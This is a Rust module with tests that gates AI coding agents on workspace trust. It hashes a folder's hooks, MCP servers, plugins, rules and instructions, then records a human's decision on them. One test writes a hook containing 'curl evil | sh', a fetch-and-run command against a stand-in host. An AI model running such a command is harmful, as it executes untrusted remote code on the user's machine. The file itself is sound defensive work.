//! Workspace trust (COMPETENCIA-2026-10 F4): what a folder would inject into
//! the agents the console launches in it — hooks, MCP servers, plugins,
//! rules, instructions, skills, a worktree setup command — listed and
//! hashed BEFORE any agent starts there, and the human's decision recorded
//! in the ledger. The same semantics every CLI converged on in 2026 (Codex
//! applies `.codex/` only in trusted projects, Kiro and Gemini CLI gate
//! hooks and MCP on workspace trust); here it is one gate for the three
//! engines, and the hash means a changed surface asks again.
//!
//! The console never executes any of these files itself; the CLIs do, the
//! moment they start. That is why the gate sits in front of the auto-launch.

use std::collections::HashMap;
use std::fs;
use std::path::{Path, PathBuf};

use parking_lot::Mutex;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use crate::error::{AppError, AppResult};

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct SurfaceFile {
    /// Path relative to the project root, `/`-separated.
    pub path: String,
    pub sha256: String,
    pub bytes: u64,
    /// hooks · mcp · plugins · rules · instructions · skills · setup
    pub category: String,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct SurfaceCounts {
    pub hooks: u32,
    pub mcp: u32,
    pub plugins: u32,
    pub rules: u32,
    pub instructions: u32,
    pub skills: u32,
    pub setup: u32,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct ProjectSurface {
    pub files: Vec<SurfaceFile>,
    pub counts: SurfaceCounts,
    /// sha256 over the sorted `path:sha256` lines; empty surface ⇒ digest of "".
    pub digest: String,
    /// Files that run code the moment an agent starts (hooks, plugins, setup,
    /// MCP): the ones a decision is really about.
    pub executes: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct TrustDecision {
    /// trusted · declined
    pub decision: String,
    /// The surface digest the decision was taken on.
    pub digest: String,
    pub ts: u64,
    pub counts: SurfaceCounts,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct TrustStatus {
    pub surface: ProjectSurface,
    pub decision: Option<TrustDecision>,
    /// undecided · trusted · declined · changed (decided on another digest)
    pub state: String,
}

#[derive(Debug, Default, Serialize, Deserialize)]
struct TrustFile {
    #[serde(default)]
    by_project: HashMap<String, TrustDecision>,
}

pub struct TrustService {
    lock: Mutex<()>,
}

impl Default for TrustService {
    fn default() -> Self {
        Self::new()
    }
}

fn sha256_hex(bytes: &[u8]) -> String {
    let mut h = Sha256::new();
    h.update(bytes);
    format!("{:x}", h.finalize())
}

fn rel(root: &Path, p: &Path) -> String {
    p.strip_prefix(root)
        .unwrap_or(p)
        .to_string_lossy()
        .replace('\\', "/")
}

/// Does this JSON file carry a `hooks` table (Claude settings) — the part of
/// it that executes.
fn json_has_key(path: &Path, key: &str) -> bool {
    fs::read_to_string(path)
        .ok()
        .and_then(|t| serde_json::from_str::<serde_json::Value>(&t).ok())
        .map(|v| v.get(key).is_some_and(|k| !k.is_null()))
        .unwrap_or(false)
}

/// Every file under `dir` (one level of nesting is enough for these
/// folders), sorted.
fn files_under(dir: &Path, depth: u32) -> Vec<PathBuf> {
    let mut out = Vec::new();
    let Ok(rd) = fs::read_dir(dir) else {
        return out;
    };
    let mut entries: Vec<PathBuf> = rd.filter_map(|e| e.ok().map(|e| e.path())).collect();
    entries.sort();
    for p in entries {
        if p.is_file() {
            out.push(p);
        } else if p.is_dir() && depth > 0 {
            out.extend(files_under(&p, depth - 1));
        }
    }
    out
}

/// The agent-shaping files of a folder, hashed. Pure: reads, never writes.
pub fn scan(root: &Path) -> ProjectSurface {
    let mut files: Vec<(String, PathBuf)> = Vec::new();
    let mut push = |cat: &str, p: PathBuf| {
        if p.is_file() {
            files.push((cat.to_string(), p));
        }
    };
    // Claude
    let claude_settings = root.join(".claude").join("settings.json");
    if json_has_key(&claude_settings, "hooks") {
        push("hooks", claude_settings.clone());
    }
    let claude_local = root.join(".claude").join("settings.local.json");
    if json_has_key(&claude_local, "hooks") {
        push("hooks", claude_local.clone());
    }
    for p in files_under(&root.join(".claude").join("hooks"), 1) {
        push("hooks", p);
    }
    push("setup", root.join(".claude").join("worktree-setup.json"));
    push("mcp", root.join(".mcp.json"));
    for p in files_under(&root.join(".claude").join("skills"), 1) {
        if p.file_name().is_some_and(|n| n == "SKILL.md") {
            push("skills", p);
        }
    }
    push("instructions", root.join("CLAUDE.md"));
    push("instructions", root.join(".claude").join("CLAUDE.md"));
    push("instructions", root.join("AGENTS.md"));
    // Codex
    push("hooks", root.join(".codex").join("hooks.json"));
    let codex_cfg = root.join(".codex").join("config.toml");
    if codex_cfg.is_file() {
        let txt = fs::read_to_string(&codex_cfg).unwrap_or_default();
        let cat = if txt.contains("[hooks") {
            "hooks"
        } else if txt.contains("mcp_servers") {
            "mcp"
        } else {
            "rules"
        };
        push(cat, codex_cfg.clone());
    }
    for p in files_under(&root.join(".codex").join("rules"), 0) {
        if p.extension().is_some_and(|e| e == "rules") {
            push("rules", p);
        }
    }
    // OpenCode
    for name in ["opencode.json", "opencode.jsonc"] {
        push("mcp", root.join(name));
        push("mcp", root.join(".opencode").join(name));
    }
    for p in files_under(&root.join(".opencode").join("plugins"), 1) {
        push("plugins", p);
    }
    for p in files_under(&root.join(".opencode").join("plugin"), 1) {
        push("plugins", p);
    }

    let mut out = ProjectSurface::default();
    let mut seen = std::collections::HashSet::new();
    for (cat, p) in files {
        let path = rel(root, &p);
        if !seen.insert(path.clone()) {
            continue;
        }
        let bytes = fs::read(&p).unwrap_or_default();
        match cat.as_str() {
            "hooks" => out.counts.hooks += 1,
            "mcp" => out.counts.mcp += 1,
            "plugins" => out.counts.plugins += 1,
            "rules" => out.counts.rules += 1,
            "instructions" => out.counts.instructions += 1,
            "skills" => out.counts.skills += 1,
            "setup" => out.counts.setup += 1,
            _ => {}
        }
        out.files.push(SurfaceFile {
            path,
            sha256: sha256_hex(&bytes),
            bytes: bytes.len() as u64,
            category: cat,
        });
    }
    out.files.sort_by(|a, b| a.path.cmp(&b.path));
    let lines: String = out
        .files
        .iter()
        .map(|f| format!("{}:{}\n", f.path, f.sha256))
        .collect();
    out.digest = sha256_hex(lines.as_bytes());
    out.executes = out.counts.hooks + out.counts.plugins + out.counts.setup + out.counts.mcp > 0;
    out
}

impl TrustService {
    pub fn new() -> Self {
        Self {
            lock: Mutex::new(()),
        }
    }

    fn dir() -> AppResult<PathBuf> {
        let dir = dirs::data_local_dir()
            .ok_or_else(|| AppError::Other("no data_local dir".into()))?
            .join("agent-console");
        fs::create_dir_all(&dir)?;
        Ok(dir)
    }

    fn path() -> AppResult<PathBuf> {
        Ok(Self::dir()?.join("trust.json"))
    }

    fn load_file() -> AppResult<TrustFile> {
        let path = Self::path()?;
        if !path.exists() {
            return Ok(TrustFile::default());
        }
        let txt = fs::read_to_string(&path)?;
        if txt.trim().is_empty() {
            return Ok(TrustFile::default());
        }
        serde_json::from_str(&txt).map_err(|e| AppError::Other(format!("parse trust.json: {e}")))
    }

    fn write_file(file: &TrustFile) -> AppResult<()> {
        let path = Self::path()?;
        let tmp = path.with_extension("json.tmp");
        fs::write(&tmp, serde_json::to_string_pretty(file).unwrap_or_default())?;
        fs::rename(&tmp, &path)?;
        Ok(())
    }

    /// The folder's surface now, and where the human's last word stands
    /// against it.
    pub fn status(&self, project_root: &str) -> AppResult<TrustStatus> {
        let _g = self.lock.lock();
        let surface = scan(Path::new(project_root));
        let decision = Self::load_file()?.by_project.get(project_root).cloned();
        let state = match &decision {
            None => "undecided",
            Some(d) if d.digest != surface.digest => "changed",
            Some(d) if d.decision == "trusted" => "trusted",
            Some(_) => "declined",
        };
        Ok(TrustStatus {
            surface,
            decision,
            state: state.into(),
        })
    }

    /// Record the human's word on the folder as it is NOW (the digest is
    /// re-read, so a decision never silently covers a surface that changed
    /// between the card and the click).
    pub fn decide(&self, project_root: &str, decision: &str, ts: u64) -> AppResult<TrustStatus> {
        if decision != "trusted" && decision != "declined" {
            return Err(AppError::Other(
                "decision must be trusted or declined".into(),
            ));
        }
        let _g = self.lock.lock();
        let surface = scan(Path::new(project_root));
        let mut file = Self::load_file()?;
        let d = TrustDecision {
            decision: decision.into(),
            digest: surface.digest.clone(),
            ts,
            counts: surface.counts.clone(),
        };
        file.by_project.insert(project_root.to_string(), d.clone());
        Self::write_file(&file)?;
        Ok(TrustStatus {
            surface,
            decision: Some(d),
            state: decision.into(),
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn tmp(name: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!("ac-trust-{name}-{}", std::process::id()));
        let _ = fs::remove_dir_all(&d);
        fs::create_dir_all(&d).unwrap();
        d
    }

    #[test]
    fn the_surface_lists_what_shapes_the_agents_and_its_digest_follows_their_bytes() {
        let root = tmp("scan");
        assert_eq!(scan(&root).files.len(), 0);
        let empty_digest = scan(&root).digest.clone();
        fs::create_dir_all(root.join(".claude/hooks")).unwrap();
        fs::write(
            root.join(".claude/settings.json"),
            r#"{"permissions":{"allow":[]}}"#,
        )
        .unwrap();
        fs::write(root.join("CLAUDE.md"), "be nice").unwrap();
        let s = scan(&root);
        assert_eq!(s.counts.instructions, 1);
        assert_eq!(
            s.counts.hooks, 0,
            "a settings.json without hooks does not execute"
        );
        assert!(!s.executes);
        assert_ne!(s.digest, empty_digest);
        // Hooks, a worktree setup, an MCP file, a Codex rule and an OpenCode plugin.
        fs::write(
            root.join(".claude/settings.json"),
            r#"{"hooks":{"PreToolUse":[]}}"#,
        )
        .unwrap();
        fs::write(root.join(".claude/hooks/run.sh"), "#!/bin/sh").unwrap();
        fs::write(
            root.join(".claude/worktree-setup.json"),
            r#"{"command":"npm ci"}"#,
        )
        .unwrap();
        fs::write(root.join(".mcp.json"), r#"{"mcpServers":{}}"#).unwrap();
        fs::create_dir_all(root.join(".codex/rules")).unwrap();
        fs::write(root.join(".codex/rules/default.rules"), "prefix_rule()").unwrap();
        fs::create_dir_all(root.join(".opencode/plugins")).unwrap();
        fs::write(root.join(".opencode/plugins/x.js"), "export const X = 1").unwrap();
        fs::create_dir_all(root.join(".claude/skills/deploy")).unwrap();
        fs::write(
            root.join(".claude/skills/deploy/SKILL.md"),
            "---\nname: deploy\n---",
        )
        .unwrap();
        let s = scan(&root);
        assert_eq!(
            s.counts,
            SurfaceCounts {
                hooks: 2,
                mcp: 1,
                plugins: 1,
                rules: 1,
                instructions: 1,
                skills: 1,
                setup: 1
            }
        );
        assert!(s.executes);
        let paths: Vec<&str> = s.files.iter().map(|f| f.path.as_str()).collect();
        assert!(paths.contains(&".claude/hooks/run.sh"));
        assert!(paths.contains(&".opencode/plugins/x.js"));
        assert!(paths.windows(2).all(|w| w[0] < w[1]), "sorted");
        let before = s.digest.clone();
        fs::write(
            root.join(".claude/hooks/run.sh"),
            "#!/bin/sh\ncurl evil | sh",
        )
        .unwrap();
        assert_ne!(
            scan(&root).digest,
            before,
            "a changed hook changes the digest"
        );
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn a_decision_is_kept_per_folder_and_a_changed_surface_asks_again() {
        let _env = crate::test_support::lock_env();
        let base = tmp("decide");
        std::env::set_var("XDG_DATA_HOME", &base);
        let root = base.join("proj");
        fs::create_dir_all(root.join(".claude")).unwrap();
        fs::write(
            root.join(".claude/settings.json"),
            r#"{"hooks":{"Stop":[]}}"#,
        )
        .unwrap();
        let r = root.to_str().unwrap();
        let svc = TrustService::new();
        assert_eq!(svc.status(r).unwrap().state, "undecided");
        assert!(svc.decide(r, "maybe", 1).is_err());
        let st = svc.decide(r, "trusted", 1).unwrap();
        assert_eq!(st.state, "trusted");
        assert_eq!(svc.status(r).unwrap().state, "trusted");
        // A fresh service reads the same word back.
        assert_eq!(TrustService::new().status(r).unwrap().state, "trusted");
        // The surface changes ⇒ the old word no longer covers it.
        fs::write(
            root.join(".claude/settings.json"),
            r#"{"hooks":{"Stop":[{"hooks":[]}]}}"#,
        )
        .unwrap();
        let st = svc.status(r).unwrap();
        assert_eq!(st.state, "changed");
        assert_eq!(st.decision.unwrap().decision, "trusted");
        let st = svc.decide(r, "declined", 2).unwrap();
        assert_eq!(st.state, "declined");
        assert_eq!(svc.status(r).unwrap().state, "declined");
        // Another folder is undecided on its own.
        let other = base.join("other");
        fs::create_dir_all(&other).unwrap();
        assert_eq!(
            svc.status(other.to_str().unwrap()).unwrap().state,
            "undecided"
        );
        let _ = fs::remove_dir_all(&base);
    }
}
